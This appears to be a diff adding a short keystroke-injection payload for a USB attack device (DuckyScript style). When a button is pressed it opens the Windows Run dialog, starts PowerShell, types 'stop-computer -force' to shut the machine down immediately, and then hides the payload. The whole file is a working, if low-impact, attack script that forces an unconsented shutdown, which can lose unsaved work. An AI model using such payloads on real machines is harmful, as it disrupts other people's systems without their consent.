@@ -1,0 +1,13 @@
+REM Shutting down computer using Powershell
+REM Author: Sean Chow
+
+WAIT_FOR_BUTTON_PRESS
+DELAY 1000
+WINDOWS r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 300
+STRING stop-computer -force
+ENTER
+HIDE_PAYLOAD
